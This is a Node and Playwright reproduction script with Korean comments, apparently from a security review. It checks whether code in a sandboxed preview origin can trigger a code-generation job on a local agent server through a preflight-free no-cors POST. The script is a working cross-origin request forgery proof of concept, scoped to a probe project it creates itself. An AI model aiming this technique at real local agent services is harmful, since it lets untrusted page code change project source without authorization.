// R2-신규: 프리뷰 origin(5174, 실제 프리뷰와 같은 sandbox 플래그)의 코드가 agent-server(:7400)에
// preflight 없는 단순 요청(no-cors, text/plain)으로 생성 작업을 시작해 프로젝트 소스를 바꿀 수 있는지 확인한다.
// 격리: 이 스크립트가 새로 만든 프로젝트만 대상으로 한다(agentMode=mock). 실행: node docs/review/repro/r2/07-preview-to-agent-csrf.mjs
import { createRequire } from 'node:module';
const require = createRequire(new URL('../../../../e2e/package.json', import.meta.url));
const { chromium } = require('@playwright/test');
const A = 'http://localhost:7400';
const health = await (await fetch(A + '/healthz')).json();
const created = await (await fetch(A + '/projects', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name: 'r2-csrf-probe', apiIds: ['customers'] }) })).json();
const before = await (await fetch(`${A}/projects/${created.projectId}`)).json();
console.log('agentMode=' + health.agentMode, 'probe project revision before =', before.revision, 'files=', Object.keys(before.files).join(','));

const browser = await chromium.launch({ channel: 'chrome' });
const page = await browser.newPage();
await page.goto('http://localhost:5173/healthz');
await page.evaluate(() => new Promise(resolve => { const f = document.createElement('iframe'); f.sandbox.add('allow-scripts', 'allow-same-origin'); f.src = 'http://localhost:5174/healthz'; f.onload = resolve; document.body.append(f); }));
const frame = page.frames().find(f => f.url().startsWith('http://localhost:5174'));
const requestId = 'r2-csrf-' + Date.now();
const result = await frame.evaluate(async ({ A, projectId, revision, requestId }) => {
  const out = {};
  // 1) 응답은 읽을 수 없는(opaque) 단순 요청이지만 서버에서는 실행된다.
  const r = await fetch(A + '/generations', { method: 'POST', mode: 'no-cors', body: JSON.stringify({ projectId, prompt: '고객 목록 화면 만들어줘', baseRevision: revision, requestId }) });
  out.generationPost = r.type + ' ' + r.status;
  // 2) CORS 모드로 응답을 읽으려는 시도 (ACAO 없음 → 차단 기대)
  try { await fetch(A + '/projects/' + projectId); out.corsRead = 'readable?!'; } catch { out.corsRead = 'blocked (no ACAO for 5174)'; }
  return out;
}, { A, projectId: created.projectId, revision: before.revision, requestId });
console.log('preview →', JSON.stringify(result));
await browser.close();
let after = before;
for (let i = 0; i < 40 && after.revision === before.revision; i++) { await new Promise(r => setTimeout(r, 250)); after = await (await fetch(`${A}/projects/${created.projectId}`)).json(); }
console.log('probe project revision after =', after.revision, '| source changed =', JSON.stringify(before.files) !== JSON.stringify(after.files), '| files=', Object.keys(after.files).join(','));
// agent-server 데이터 디렉터리에서 프리뷰가 보낸 requestId의 generation이 실제로 만들어졌는지 확인(응답은 opaque라 id를 모름).
const { readdirSync, readFileSync } = await import('node:fs');
const dir = new URL('../../../../services/agent-server/data/generations/', import.meta.url);
const hit = readdirSync(dir).map(f => JSON.parse(readFileSync(new URL(f, dir), 'utf8'))).find(g => g.request?.requestId === requestId);
console.log('server-side generation from preview request:', hit ? JSON.stringify({ state: hit.state, projectId: hit.request.projectId === created.projectId ? '<probe project>' : 'other', events: hit.events.map(e => e.type) }) : 'not found');
